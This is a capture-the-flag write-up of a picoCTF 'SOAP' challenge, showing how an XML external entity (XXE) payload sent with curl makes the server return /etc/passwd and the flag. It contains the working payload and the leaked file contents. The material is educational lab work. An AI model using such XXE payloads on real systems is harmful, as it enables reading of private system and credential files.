# SOAP

XXE + copy and paste for me... But this is something new to me.

I remember I saw the term SOAP when Java and XML was popular...

## Problem

The website takes a XML as parameter. I just show you the bash output as if everything done in `curl`.

Beautified XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<data>
    <ID>1</ID>
</data>
```

```bash
$ curl 'http://saturn.picoctf.net:56917/data' -X POST -H 'Content-Type: application/xml' --data-raw '<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>'

<strong>Special Info::::</strong> University in Kigali, Rwanda offereing MSECE, MSIT and MS EAI
```

These info shows well in the original website as HTML content.

## XXE

Copy and paste the info from this website. <https://brightsec.com/blog/xxe-attack/>

```txt
> How Do XXE Attacks Work?

XML is an extremely popular format used by developers to transfer data between the web browser and the server.

XML requires a parser, which is often where vulnerabilities are introduced. XXE enables the attacker to define entities defined based on the content of a URL or file path. When the server reads the XML attack payload, it parses the external entity, merges it into the final document, and returns it to the user with the sensitive data inside.

XXE attacks can also be leveraged by an attacker to perform an SSRF attack and compromise the server.
```

Don't know that those XML parser can leak so much information... This is scary.

## Solution

This is the sample payload copy from <https://portswigger.net/web-security/xxe>.

From the original normal XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

To the payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

So it seems all we need to do is do define `xxe` in our XML as `&xxe;` and define it to point to `file://etc/passwd` with `<!ENTITY>`

Modify our payload so it looks similar to the XML which is used in the website.

Our original XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<data>
    <ID>1</ID>
</data>
```

The payload XML: (3,2 or 1 slash after `file:` seems doesn't matter)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>
    <ID>&xxe;</ID>
</data>
```

In one line: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>`

Do it with curl:

```bash
$ curl 'http://saturn.picoctf.net:56917/data' -X POST -H 'Content-Type: application/xml'  --data-raw '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>'

Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XXE_flag}
```

It would normally shows `Invalid ID: 4`, `Invalid ID: 2+1`. But this time it puts all the content of `/etc/passwd` into `ID` and show the value of `ID` in the failure message...
